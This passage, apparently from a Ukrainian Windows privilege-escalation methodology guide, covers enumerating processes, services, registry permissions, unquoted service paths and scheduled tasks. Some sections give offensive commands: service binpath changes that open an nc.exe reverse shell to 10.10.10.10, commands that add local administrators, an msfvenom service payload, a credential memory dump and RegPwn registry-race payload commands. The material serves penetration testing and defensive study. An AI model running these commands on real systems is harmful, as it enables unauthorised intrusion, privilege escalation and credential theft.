### Користувачі, що увійшли в систему / Сеанси

```bash
qwinsta
klist sessions
```

### Домашні папки

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Політика паролів

```bash
net accounts
```

### Отримання вмісту буфера обміну

```bash
powershell -command "Get-Clipboard"
```

## Запущені процеси

### Дозволи на файли та папки

Насамперед під час переліку процесів **перевірте, чи немає паролів у командному рядку процесу**.\
Перевірте, чи можете ви **перезаписати якийсь запущений бінарний файл** або чи маєте права на запис у папку з бінарним файлом, щоб скористатися потенційними [**атаками DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Завжди перевіряйте, чи не запущені [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md), оскільки їх можна використати для підвищення привілеїв.

Debugger listener може працювати недовго, тому його відсутність в одному знімку пасивного сканування портів не доводить, що він ніколи не був доступний. Якщо виявили listener, з’ясуйте його PID, власника процесу та чи може до нього підключитися користувач із нижчими привілеями; самої лише назви програми або debug-прапорця недостатньо, щоб підтвердити можливість виконання коду від імені іншого користувача. Під час звичайного збору даних дійте пасивно, не надсилаючи debugger-команди.

**Перевірка дозволів на бінарні файли процесів**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Перевірка дозволів для папок із виконуваними файлами процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Каталоги динамічних препроцесорів Snort

Snort 2 може завантажувати shared libraries з каталогу `dynamicpreprocessor directory`, указаного в конфігурації, вибраній за допомогою `snort.exe -c <config>`. Якщо заплановане завдання або служба запускає Snort від імені іншого облікового запису, перевірте саме цю конфігурацію та ACL каталогу модулів, указаного в ній. Якщо ваш token може створювати там файли, цей шлях варто перевірити на можливість code execution під час наступного завантаження модулів цим завданням або службою. Перевірте ефективні привілеї облікового запису, від імені якого запускається процес, активну конфігурацію, сумісність модулів і будь-які обмеження deny або спільного доступу; сам факт можливості запису в каталог не доводить можливість підвищення привілеїв. У [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) описано завантаження модулів під час виконання.

### Привілейована вебслужба з кореневим каталогом документів, доступним для запису

В інсталяції Apache на Windows порівняйте шлях до виконуваного файла служби та обліковий запис, від імені якого вона запускається, зі значенням `DocumentRoot` в активному `httpd.conf`. Для типової структури XAMPP перевірте `C:\xampp\apache\conf\httpd.conf` і ACL налаштованого кореневого каталогу документів, часто `C:\xampp\htdocs`. Якщо користувач із нижчими привілеями може створювати файли в цьому каталозі, а Apache працює як `LocalSystem`, виконання коду на сервері може перетнути межу привілеїв хоста. Переконайтеся, що служба працює, що саме цей шлях обслуговується, а обробник на сервері обробляє цей тип файла; можливість запису в кореневий каталог сама по собі доводить лише можливість створення файла. Перевірте ACL, не створюючи пробного файла:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Для стандартної інсталяції WAMP служба може вказувати на версіонований `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (або `C:\wamp\...` для 32-бітної структури), а конфігурація поруч із ним — у `conf\httpd.conf`, зі стандартним кореневим каталогом `C:\wamp64\www` або `C:\wamp\www`. Перевірте разом точний образ служби, обліковий запис, від імені якого вона запускається, ефективний `DocumentRoot` (зокрема підстановку `${INSTALL_DIR}` і перевизначення віртуальних хостів) та ACL кореневого каталогу. Доступність для запису до каталогу WAMP сама по собі не доводить, що Apache запускається від імені `SYSTEM` або виконує надісланий файл. [Apache documents how a Windows service selects its configuration](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Доступний для запису кореневий каталог IIS та мережева ідентичність пулу застосунків

Для IIS зіставте фізичний каталог, доступний для запису, з **активним сайтом/застосунком** у `applicationHost.config`, а потім визначте налаштований пул і серверний обробник. Код, розміщений у каталозі, що обслуговується, виконується від імені пулу лише тоді, коли IIS обробляє цей тип файлів і маршрут доступний. Перш ніж вважати доступний для запису каталог шляхом до виконання коду, перевірте ефективний доступ поточного користувача до створення файлів, стан сайту під час роботи, обробник і перевизначення для конкретного шляху.

Динамічна компіляція ASP.NET створює окремий шлях для перевірки: згенеровані файли в каталозі компіляції застосунку. За замовчуванням це каталог `Temporary ASP.NET Files` у відповідній інсталяції .NET Framework, але параметр `<compilation tempDirectory>` застосунку може змінити його. [Microsoft documents the location and per-application subdirectories](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) and [recommends isolating compilation directories when application pools do not trust each other](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Якщо токен із нижчими привілеями може змінити згенерований код у кеші **конкретного** застосунку, з’ясуйте, чи компілює застосунок його повторно з ідентичністю [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) із вищими привілеями. Самі лише ACL файлу або каталогу не доводять виконання коду: зіставте кеш з активним застосунком, ефективним токеном і ACL, параметрами компіляції, ідентичністю процесу та часом повторної компіляції. Перевіряйте метадані лише для читання; під час переліку не запускайте компіляцію та не змінюйте файли кешу.

Пул IIS, налаштований як `ApplicationPoolIdentity` або `NetworkService`, зазвичай автентифікується до ресурсів домену як **обліковий запис комп’ютера-хоста**, хоча його локальний токен може мати низькі привілеї. `LocalSystem` уже має високі локальні привілеї та також використовує обліковий запис комп’ютера в мережі; `LocalService` зазвичай використовує анонімні мережеві облікові дані. Пул `SpecificUser` використовує налаштований для нього обліковий запис. [Microsoft documents these identity types](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) and [the application-pool network identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Якщо параметр ідентичності не задано, можуть успадковуватися стандартні параметри пулу, які відрізняються між поколіннями IIS, тому з’ясуйте ефективну конфігурацію, а не робіть припущень за назвою пулу. Якщо виконання коду відбувається в пулі з мережевою ідентичністю облікового запису комп’ютера, оцініть права доступу до каталогу саме **цього комп’ютера**. [DCSync](../active-directory-methodology/dcsync.md) вимагає прав реплікації в контексті іменування домену; квиток облікового запису комп’ютера або роль хоста самі по собі не доводять наявності таких прав. Під час пасивного переліку перевіряйте конфігурацію та ACL, не завантажуючи файл, не виконуючи мережеву автентифікацію та не запитуючи квитки.

Для доступного для читання обробника ASP.NET, який запускає допоміжний процес, простежте шлях будь-якого значення, отриманого із запиту, через автентифікацію, розшифрування, перевірку та побудову команди. Обробник, який об’єднує декодований токен із `ProcessStartInfo("cmd", "/c ...")`, може дозволити метасимволам оболонки змінити команду; [Microsoft documents `cmd`'s special characters](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Переконайтеся, що ненадійний викликач справді може впливати на декодоване значення та звернутися до обробника, а потім визначте ефективну ідентичність пулу застосунків або ідентичність під час імперсонації, а також ідентичність дочірнього процесу. Рядок у доступному для читання вихідному коді, слухач на localhost або слабкість формату токена самі по собі не доводять можливості виконання команд із привілеями. Переглядайте вихідний код і конфігурацію пулу, не надсилаючи підроблених запитів і не запускаючи допоміжний процес під час пасивного переліку.

Для служби PHP у Windows шлях, контрольований запитом і переданий у [`include` or `require`](https://www.php.net/manual/en/function.include.php), може виконати PHP-файл, доступний для запису користувачеві з нижчими привілеями, від імені робочого процесу. Переконайтеся, що запит може дійти до цього рядка, визначений шлях вказує на файл, який користувач із нижчими привілеями може змінювати, а робочий процес — читати, обмеження шляхів PHP дозволяють включення і робочий процес справді має вищі привілеї. Слухач на loopback-адресі або доступний для запису файл самі по собі не доводять наявності такого ланцюжка; перевіряйте вихідний код, ідентичність служби та ACL файлів, не викликаючи кінцеву точку під час пасивного переліку.

### Пошук паролів у пам’яті

За допомогою **procdump** із Sysinternals можна створити дамп пам’яті запущеного процесу. Служби на кшталт FTP зберігають **облікові дані в пам’яті у відкритому вигляді**; спробуйте створити дамп пам’яті та прочитати облікові дані.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Незахищені GUI-застосунки

**Застосунки, запущені від імені SYSTEM, можуть дозволити користувачу запустити CMD або переглядати каталоги.**

Приклад: «Довідка та підтримка Windows» (Windows + F1), знайдіть «командний рядок», натисніть «Клацніть, щоб відкрити командний рядок»

### Імпорт файлів проєкту з підвищеними привілеями

Застосунок, який автоматично відкриває проєкти з каталогу для скидання файлів, доступного на запис користувачам із нижчими привілеями, перетинає межу довіри до вхідних даних від імені облікового запису імпортера. Перевірте **точний шлях із правом запису**, процес або завдання, що відкриває його, ефективну ідентичність і збірку парсера. [Історична проблема відкриття/відновлення проєкту Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) дозволяла використовувати зовнішні сутності XML у метаданих проєкту; мережева сутність у Windows могла спричинити автентифікацію від імені облікового запису імпортера, якщо це дозволяла [політика вихідних підключень SMB і NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). Це потенційний шлях до викриття облікових даних, а не безпосередній доступ адміністратора: отриману відповідь потрібно мати змогу використати через окремий авторизований або вразливий шлях, а поточні збірки слід оцінювати з огляду на фактичний стан виправлень. Не відкривайте спеціально створений проєкт під час пасивного перерахування; перевірте процес імпорту та ACL.

## Служби

Право [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) для об’єкта Service Control Manager (SCM) відрізняється від прав на наявну службу. Успішний запит лише на читання [`OpenSCManager` для отримання доступу](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) з цим правом — це підстава для перевірки, а не доказ того, що нову службу можна запустити. [`CreateService` повертає дескриптор](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) із правами доступу до служби, запитаними під час її створення; повторне відкриття служби пізніше виконує окрему перевірку доступу й може завершитися невдачею, навіть якщо початковий дескриптор можна було використати. Окремо перевірте ефективний локальний або віддалений токен, права на отриманий дескриптор, обліковий запис служби, політику запуску та шлях до виконуваного файла. Не створюйте й не запускайте службу під час пасивного перерахування.

Для віддаленого встановлення служби зіставте ці права SCM із спільним ресурсом на цільовій системі, до якого **той самий мережевий сеанс входу** має право запису, базовим ACL NTFS цього ресурсу та локальним шляхом до виконуваного файла, який може запустити обліковий запис служби. Обліковий запис без прав адміністратора може перетнути цю межу, якщо існують незвично широкі права SCM і шлях розміщення файла; адміністративний ресурс не є обов’язковою передумовою. Самого права запису до спільного ресурсу або самої підстави перевірити право створення служби в SCM недостатньо, щоб довести, що нову службу можна запустити з вищими привілеями.

Наявна служба може запускати допоміжний виконуваний файл під час запуску, зупинки чи іншої події життєвого циклу, навіть якщо цього файла немає в її `ImagePath`. Якщо ім’я допоміжного файла розв’язується до каталогу, доступного на запис користувачам із нижчими привілеями, а служба працює з вищими привілеями, відсутній допоміжний файл може бути кандидатом на підміну за певних умов. Підтвердьте **фактичний код служби або документований виклик допоміжного файла**, шлях до виконуваного файла після розв’язання і порядок пошуку, права на створення файлів у каталозі, ідентичність служби та наявність доступного тригера життєвого циклу. Каталог служби з правом запису або сам факт відсутності файла не доводять, що служба завантажить цей файл; під час пасивної перевірки не запускайте й не зупиняйте службу.

Для наявної служби [`SERVICE_START` дозволяє передавати аргументи в `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); це право відрізняється від [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Перш ніж вважати право запуску чимось більшим за право керування, перевірте код служби або її документований інтерфейс. Якщо служба використовує вибраний викликачем аргумент як шлях до журналу або експорту, перевірте ідентичність служби, точний потік даних від аргументу до операції запису, обмеження шляхів і дозволи для **створеного файла**. Запис у захищений каталог може призвести до підвищення привілеїв лише за наявності окремого привілейованого споживача або завантажувача, який приймає цей файл; самого права запису до журналу чи права запуску недостатньо. Під час пасивної інвентаризації не запускайте службу й не створюйте тестовий файл.

Для агента моніторингу NSClient++ доступний для читання `nsclient.ini` є **підставою перевірити конфігурацію**: у ньому можуть міститися облікові дані вебінтерфейсу, а `boot.ini` може перенаправляти конфігурацію в інше місце. Перевірте фактичний обліковий запис служби, слухач WEB і політику доступу, а також те, чи може автентифікована роль змінювати налаштування або скрипти. Для виконання з підвищеними привілеями додатково потрібні `CheckExternalScripts` (або інший увімкнений шлях виконання), фактичне право реєструвати чи змінювати команду та тригер, який запускає її від імені служби. До слухача, що приймає підключення лише через loopback, локальний користувач усе одно може мати доступ, але сам шлях до файла, пароль чи слухач не доводять наявності потрібних прав. Під час пасивного перерахування переглядайте метадані й дозволи, не показуючи секрети та не викликаючи веб-API. Див. [структуру файлів NSClient++](https://nsclient.org/docs/concepts/file-layout/), [рекомендації з безпеки вебінтерфейсу та скриптів](https://nsclient.org/docs/setup/securing/) і [налаштування зовнішніх скриптів](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Для служби, у якої `ImagePath` має значення `nssm.exe`, перевірте фактичний обліковий запис запуску служби та значення `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM зберігає там дочірній застосунок](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), а `AppDirectory` задає налаштований робочий каталог. Перш ніж вважати дозволи обгортки повним описом межі безпеки служби, перевірте дочірній виконуваний файл і ACL його батьківського каталогу. Локальна кінцева точка WCF або SOAP, доступна через цей дочірній процес, є окремою підставою для перевірки: переконайтеся, що кінцева точка доступна користувачу з нижчими привілеями, конкретна операція приймає його вхідні дані, а дочірній процес служби виконує небезпечну операцію з вищими привілеями. Сам обліковий запис служби, URL кінцевої точки чи шлях із правом запису не доводять можливості підвищення привілеїв; під час пасивного перерахування не викликайте операції служби.

Для власної операції WCF простежте шлях рядка, контрольованого викликачем, до будь-якого PowerShell runspace. [`Pipeline.Commands.AddScript` додає текст скрипту](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), а [`Pipeline.Invoke` запускає конвеєр](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` з обліковими даними Windows для транспортного рівня](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) автентифікує клієнта, але право викликати **саме цю** операцію та ефективну ідентичність runspace потрібно перевіряти окремо. Шлях від введених даних викликача з нижчими привілеями до `AddScript`, що виконується з ідентичністю служби з вищими привілеями, є межею виконання коду; сам порт, автентифікований клієнт або невикористовуваний метод у сторонній збірці нічого не доводять. Статично перевірте розгорнуту службу, контракт, авторизацію та налаштування імперсонації, не викликаючи кінцеву точку під час перерахування.

Service Triggers дають Windows змогу запускати службу за певних умов (активність іменованого каналу/RPC-кінцевої точки, події ETW, доступність IP, підключення пристрою, оновлення GPO тощо). Навіть без права SERVICE_START часто можна запускати служби з підвищеними привілеями, активуючи їхні тригери. Методи перерахування та активації наведено тут:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Служба збору діагностики Visual Studio

До інсталяцій Visual Studio з інструментами C/C++ може входити `VSStandardCollectorService150` — служба діагностики, налаштована на запуск від імені `LocalSystem`. У [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) для перенаправлення скидання DACL служби використовували junction і гонку з object-manager-link. Для продемонстрованого підвищення привілеїв також потрібен був доступний шлях відновлення MSI через Visual Studio Setup WMI Provider і його цільовий файл `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Компонент виправили в січні 2024 року.

Для пасивної перевірки перегляньте обліковий запис і шлях до виконуваного файла цієї служби, перевірте наявність шляху до компілятора Setup WMI та стан виправлень установленого компонента. Сам запис служби, версія продукту Visual Studio або файл компілятора не доводять, що система вразлива. Для перевірки не потрібно запускати службу чи виконувати відновлення.

Отримайте список служб:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Дозволи

За допомогою **sc** можна отримати інформацію про службу.

```bash
sc qc <service_name>
```

Рекомендується мати бінарний файл **accesschk** від _Sysinternals_, щоб перевірити необхідний рівень привілеїв для кожної служби.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Рекомендується перевірити, чи можуть «Authenticated Users» змінювати будь-яку службу:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Ви можете завантажити accesschk.exe для XP звідси](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Увімкнення служби

Якщо ви бачите цю помилку (наприклад, із SSDPSRV):

_Сталася системна помилка 1058._\
_Службу не вдалося запустити: її вимкнено або з нею не пов’язано жодного ввімкненого пристрою._

Її можна ввімкнути за допомогою

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Врахуйте, що для роботи служби upnphost потрібна служба SSDPSRV (для XP SP1)**

**Інший спосіб обійти цю проблему** — виконати:

```
sc.exe config usosvc start= auto
```

### **Змінити шлях до бінарного файлу служби**

Якщо група «Автентифіковані користувачі» має **SERVICE_ALL_ACCESS** для служби, можна змінити її виконуваний бінарний файл. Щоб змінити та виконати **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Перезапуск служби

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Привілеї можна підвищити завдяки різним дозволам:

- **SERVICE_CHANGE_CONFIG**: Дозволяє змінювати конфігурацію бінарного файлу служби.
- **WRITE_DAC**: Дозволяє змінювати дозволи, що дає змогу змінювати конфігурацію служби.
- **WRITE_OWNER**: Дозволяє отримати права власника та змінювати дозволи.
- **GENERIC_WRITE**: Успадковує можливість змінювати конфігурацію служби.
- **GENERIC_ALL**: Також успадковує можливість змінювати конфігурацію служби.

Для виявлення та експлуатації цієї вразливості можна скористатися _exploit/windows/local/service_permissions_.

### Слабкі дозволи на бінарні файли служб

Якщо служба працює від імені **`LocalSystem`**, **`LocalService`**, **`NetworkService`** або привілейованого доменного облікового запису, але **користувачі з низькими привілеями можуть змінювати EXE-файл служби або його батьківську папку**, часто можна перехопити службу, **замінивши бінарний файл і перезапустивши службу**.

**Перевірте, чи можете ви змінити бінарний файл, який запускає служба,** або чи маєте **дозволи на запис у папку**, де розташований бінарний файл ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Отримати список усіх бінарних файлів, які запускають служби, можна за допомогою **wmic** (не в system32), а потім перевірити дозволи за допомогою **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Також можна використовувати **sc** та **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Шукайте небезпечні ACL, надані **`Everyone`**, **`BUILTIN\Users`** або **`Authenticated Users`**, особливо **`(F)`**, **`(M)`** або **`(W)`** для виконуваного файлу служби чи каталогу, у якому він міститься. Практичний сценарій зловживання:<sup>[[27]](#references)</sup>

1. Визначте обліковий запис служби та шлях до виконуваного файлу за допомогою `sc qc <service_name>`.
2. Перевірте, чи доступний бінарний файл для запису, за допомогою `icacls <path>`.
3. Замініть бінарний файл служби на payload або дійсний шкідливий бінарний файл служби.
4. Перезапустіть службу за допомогою `sc stop <service_name> && sc start <service_name>` (або дочекайтеся перезавантаження чи тригера служби).

Корисні автоматизовані перевірки:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Якщо служба не дозволяє звичайному користувачу перезапускати її, перевірте, чи запускається вона автоматично під час завантаження, чи має дію для перезапуску в разі збою, або чи можна опосередковано запустити її через програму, яка її використовує.

### Дозволи на зміну розділів реєстру служб

Перевірте, чи можете ви змінювати розділи реєстру служб.\
Ви можете **перевірити** свої **дозволи** для **розділу реєстру** служби, виконавши:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Перевірте, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** права на запис до ключа реєстру певної служби. Сам запис ACL не доводить наявність ефективного доступу: важливі заборонні записи, поточний токен і успадковані дозволи. Права на ключ реєстру відрізняються від прав `SERVICE_CHANGE_CONFIG` і `SERVICE_START` для об’єкта служби. Для підвищення привілеїв також потрібне придатне для використання поле конфігурації служби, спосіб запустити службу та обліковий запис служби з вищими привілеями. Див. довідки Microsoft про [права на ключі реєстру](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) і [права доступу до служб](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Щоб змінити шлях до виконуваного бінарного файла:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Гонка з symlink реєстру для довільного запису значення HKLM (ATConfig)

Деякі функції спеціальних можливостей Windows створюють ключі **ATConfig** для окремих користувачів, які згодом процес **SYSTEM** копіює до ключа сеансу HKLM. **Гонка з symbolic link реєстру** може перенаправити цей привілейований запис до **будь-якого шляху HKLM**, надаючи примітив **запису довільного значення** до HKLM.<sup>[[18]](#references)</sup>

Розташування ключів (приклад: екранна клавіатура `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` містить список установлених функцій спеціальних можливостей.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` зберігає конфігурацію, контрольовану користувачем.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` створюється під час входу або переходів до захищеного робочого стола й доступний користувачеві для запису.

Схема експлуатації (CVE-2026-24291 / ATConfig):

1. Заповніть значення **HKCU ATConfig**, яке має бути записане процесом SYSTEM.
2. Запустіть копіювання до захищеного робочого стола (наприклад, **LockWorkstation**), яке запускає процес брокера AT.
3. **Виграйте гонку**, встановивши **oplock** на `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; коли спрацює oplock, замініть ключ **HKLM Session ATConfig** на **registry link** до захищеного цільового ключа HKLM.
4. SYSTEM запише вибране зловмисником значення до перенаправленого шляху HKLM.

Отримавши можливість записувати довільні значення HKLM, перейдіть до LPE, перезаписавши значення конфігурації служби:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/командний рядок)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Виберіть службу, яку може запускати звичайний користувач (наприклад, **`msiserver`**), і запустіть її після запису. **Примітка:** реалізація публічного експлойту **блокує робочу станцію** в межах гонки.

Приклад інструментів (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Дозволи AppendData/AddSubdirectory для реєстру служб

Якщо у вас є цей дозвіл для реєстру, це означає, що **ви можете створювати підрозділи реєстру в ньому**. Для служб Windows цього **достатньо, щоб виконати довільний код:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Якщо шлях до виконуваного файлу не взято в лапки, Windows спробує виконати кожен варіант шляху, що закінчується перед пробілом.

Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows спробує виконати:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Перелічіть усі шляхи служб, не взяті в лапки, за винятком шляхів вбудованих служб Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ви можете виявити й експлуатувати** цю вразливість за допомогою metasploit: `exploit/windows/local/trusted\_service\_path`. Ви можете вручну створити бінарний файл служби за допомогою metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Дії відновлення

Windows дозволяє користувачам задавати дії, які виконуватимуться в разі збою служби. Цю функцію можна налаштувати так, щоб вона вказувала на бінарний файл. Якщо цей файл можна замінити, може бути можливе підвищення привілеїв. Докладніше див. в [офіційній документації](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Цілі скриптів запланованих завдань

Для ввімкненого завдання, яке запускає `cmd.exe /c` із файлом `.bat` або `.cmd`, перевірте скрипт, указаний в **аргументах дії**, а також `cmd.exe`. Те саме стосується явного аргументу-файлу інтерпретатора, наприклад `-File` у PowerShell. Якщо запланований batch-файл містить буквальний виклик PowerShell `-File`, перевірте також ACL указаного скрипту; змінні, умовні оператори та ланцюжки команд потребують ручного аналізу. Скрипт або батьківський каталог, доступний для запису викликачу, є потенційним шляхом до виконання від імені іншого облікового запису лише тоді, коли налаштований principal завдання відрізняється від викликача, а завдання справді доходить до цієї дії. ACL, що дозволяє лише додавання, може мати значення для скриптів, але попередній `exit` або інша логіка керування потоком може зробити додані рядки недосяжними. Перш ніж заявляти про підвищення привілеїв, перевірте ефективні ACL, [контекст виконання завдання](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), робочий каталог, тригер і політику керування застосунками. Інвентаризація не повинна змінювати скрипт або запускати завдання.

## Іменовані потоки в доступних файлах

У NTFS читабельний файл може мати іменований потік `:$DATA`, вміст якого не відображається у звичайному списку каталогів. Для невеликого релевантного набору доступних резервних копій або файлів конфігурації перевірте **назви та розміри** потоків, перш ніж відкривати їхній вміст; Windows надає доступ до них через [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) і PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Назва потоку, що натякає на секрет, — лише зачіпка. Перевірте ефективний доступ на читання до файлу, підтримку потоків файловою системою, наявність у потоці придатних до використання облікових даних і обліковий запис, для автентифікації якого вони фактично використовуються. Під час звичайного переліку уникайте рекурсивного сканування потоків і виведення їхнього вмісту.

## Вхідні файли помічника Windows Driver Kit у запланованих завданнях

